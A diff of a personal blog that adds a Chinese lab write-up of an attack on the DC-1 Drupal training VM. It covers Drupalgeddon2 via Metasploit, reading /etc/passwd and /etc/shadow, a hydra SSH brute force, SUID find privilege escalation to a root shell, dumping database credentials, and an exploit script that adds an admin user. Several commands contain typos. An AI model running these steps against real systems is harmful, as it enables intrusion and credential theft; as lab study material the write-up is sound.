@@ -124,7 +124,7 @@
     <article id="post-打靶后个人的一些总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/21/%E6%89%93%E9%9D%B6%E5%90%8E%E4%B8%AA%E4%BA%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" class="article-date">
-  <time class="dt-published" datetime="2024-03-21T13:17:42.878Z" itemprop="datePublished">2024-03-21</time>
+  <time class="dt-published" datetime="2024-03-20T16:00:00.000Z" itemprop="datePublished">2024-03-21</time>
 </a>
     
   </div>
@@ -256,24 +256,114 @@
   
     <article id="post-DC-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/03/21/DC-1/" class="article-date">
-  <time class="dt-published" datetime="2024-03-21T13:07:40.442Z" itemprop="datePublished">2024-03-21</time>
+    <a href="/2024/03/19/DC-1/" class="article-date">
+  <time class="dt-published" datetime="2024-03-18T16:00:00.000Z" itemprop="datePublished">2024-03-19</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/19/DC-1/">对druplal搭建的网站进行渗透测试</a>
+    </h1>
+  
+
+      </header>
+    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <span id="more"></span>
+
+<p>nmap扫描</p>
+<p>nmap -sV -p- 172.20.10.9</p>
+<p>并没有什么收获</p>
+<p>尝试用户密码无果</p>
+<p>因Druqal为比较出名的一个cms网站</p>
+<p>于是尝试在msf中搜素Druqal相关漏洞</p>
+<p>msfconsole</p>
+<p>search Druqal</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709198189894-9248e02e-34a7-4a0b-945c-7a0bc2908d41.png" alt="img"></p>
+<p>尝试使用exp，发现1号漏洞有效</p>
+<p>use exploit&#x2F;unix&#x2F;webapp&#x2F;druqal_druqalgeddon2</p>
+<p>show options</p>
+<p>配置相关信息</p>
+<p>set rhosts 172.20.10.9</p>
+<p>发起攻击</p>
+<p>exploit&#x2F;run</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709198923312-ad4ad043-b653-41d3-828b-41031412e810.png" alt="img"></p>
+<p>输入shell即可执行相关操作</p>
+<p>cat &#x2F;etc&#x2F;passwd</p>
+<p>查看passwd，发现flag4这个用户</p>
+<p>cat &#x2F;etc&#x2F;shadow</p>
+<p>查看shadow，发现没有权限</p>
+<p>尝试去破解一下flag4的密码</p>
+<p>使用hydra破解</p>
+<p>hydra -1 flag4 -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 172.20.10.9 ssh</p>
+<p>#破解ssh协议</p>
+<p>密码字典位置&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709205366050-bc00adc5-ac20-43e5-b1a9-aef0ae5dcffe.png" alt="img"></p>
+<p>发现flag4密码为orange</p>
+<p>使用ssh登录</p>
+<p>ssh <a href="mailto:&#x66;&#x6c;&#97;&#103;&#x34;&#x40;&#49;&#x37;&#x32;&#x2e;&#x32;&#48;&#46;&#49;&#x30;&#46;&#x39;">&#x66;&#x6c;&#97;&#103;&#x34;&#x40;&#49;&#x37;&#x32;&#x2e;&#x32;&#48;&#46;&#49;&#x30;&#46;&#x39;</a></p>
+<p>接着需要提权到root权限</p>
+<p>cd &#x2F;root <img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709205797156-4cdc4dcc-dbac-409e-ab58-7afad76e9a0e.png" alt="img"></p>
+<p>发现被阻止了</p>
+<p>find &#x2F;root</p>
+<p>成功看到root目录下的文件</p>
+<p>提权</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p>发现有什么东西可以以root权限执行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709206219800-b69d5e2a-4dcb-44f8-a6b2-1dd0dc87014a.png" alt="img"></p>
+<p>发现&#x2F;usr&#x2F;bin&#x2F;find</p>
+<p>创建一个名为hah的文件</p>
+<p>touch hah</p>
+<p>查找并执行命令</p>
+<p>find &#x2F; -name hah -exec “&#x2F;bin&#x2F;sh” \</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709206544917-492f36e6-af0f-452f-8cb4-cacb5de4c7ac.png" alt="img"></p>
+<p>whoami发现已经是root权限了</p>
+<p>查看Druqal默认配置文件(关键目录)</p>
+<p>cat var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p>
+<p>发现数据库用户和密码<img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709199277669-c494d586-fc89-458f-b4dd-7ce12fdff9be.png" alt="img"></p>
+<p>python -c ‘import pty;pty.spawn (“&#x2F;bin&#x2F;bash”)’</p>
+<p>#ps：美化命令界面</p>
+<p>尝试登录数据库</p>
+<p>mysql -u dbuser -p R0ck3t</p>
+<p>查看数据库</p>
+<p>show databases;</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709199796134-e093c0c8-8c78-4fd9-80bd-700f21c7cb29.png" alt="img"></p>
+<p>use drupaldb;</p>
+<p>会发现有很多表</p>
+<p>查看users这个表</p>
+<p>select * from user;</p>
+<p>发现有很多用户和加密过的密码</p>
+<p>接下来去拿到数据库的控制权限，两种方法：</p>
+<p>方法1：</p>
+<p>在数据库里建立一个管理员级别的用户</p>
+<p>php scripts&#x2F;password-hash.sh 密码</p>
+<p>使用drupal的密码生成工具自动生成密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709203934190-a901b6c0-73f5-4503-bb92-09e313ae2790.png" alt="img"></p>
+<p>用生成好的密码替换掉管理员的密码</p>
+<p>方法2：</p>
+<p>使用漏洞创建一个用户</p>
+<p>打开msf-msfconsole</p>
+<p>searchsploit Druqal</p>
+<p>找到add admin user的漏洞</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709204488695-3207e116-d0d8-40ac-ad86-dddcedf4d14f.png" alt="img"></p>
+<p>python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py -t <a target="_blank" rel="noopener" href="http://172.20.10.9/">http://172.20.10.9</a> -u 用户名 -p 密码</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/DC-1/" data-id="clu190wzu0000m8f1hx615842" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/19/DC-1/" data-id="clu190wzu0000m8f1hx615842" data-title="对druplal搭建的网站进行渗透测试" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" rel="tag">渗透实战</a></li></ul>
+
     </footer>
   </div>
   
@@ -524,7 +614,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cobalt-Strike/" rel="tag">Cobalt Strike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cobaltstrike/" rel="tag">cobaltstrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E6%80%9D%E6%80%BB%E7%BB%93/" rel="tag">反思总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E8%B7%B5%E5%BA%94%E7%94%A8/" rel="tag">实践应用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" rel="tag">技术基础</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cobalt-Strike/" rel="tag">Cobalt Strike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cobaltstrike/" rel="tag">cobaltstrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E6%80%9D%E6%80%BB%E7%BB%93/" rel="tag">反思总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E8%B7%B5%E5%BA%94%E7%94%A8/" rel="tag">实践应用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" rel="tag">技术基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" rel="tag">渗透实战</a></li></ul>
     </div>
   </div>
 
@@ -534,7 +624,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Cobalt-Strike/" style="font-size: 15px;">Cobalt Strike</a> <a href="/tags/cobaltstrike/" style="font-size: 10px;">cobaltstrike</a> <a href="/tags/%E5%8F%8D%E6%80%9D%E6%80%BB%E7%BB%93/" style="font-size: 10px;">反思总结</a> <a href="/tags/%E5%AE%9E%E8%B7%B5%E5%BA%94%E7%94%A8/" style="font-size: 10px;">实践应用</a> <a href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" style="font-size: 20px;">技术基础</a>
+      <a href="/tags/Cobalt-Strike/" style="font-size: 15px;">Cobalt Strike</a> <a href="/tags/cobaltstrike/" style="font-size: 10px;">cobaltstrike</a> <a href="/tags/%E5%8F%8D%E6%80%9D%E6%80%BB%E7%BB%93/" style="font-size: 10px;">反思总结</a> <a href="/tags/%E5%AE%9E%E8%B7%B5%E5%BA%94%E7%94%A8/" style="font-size: 10px;">实践应用</a> <a href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" style="font-size: 20px;">技术基础</a> <a href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" style="font-size: 10px;">渗透实战</a>
     </div>
   </div>
 
@@ -564,7 +654,7 @@
           </li>
         
           <li>
-            <a href="/2024/03/21/DC-1/">(no title)</a>
+            <a href="/2024/03/19/DC-1/">对druplal搭建的网站进行渗透测试</a>
           </li>
         
           <li>
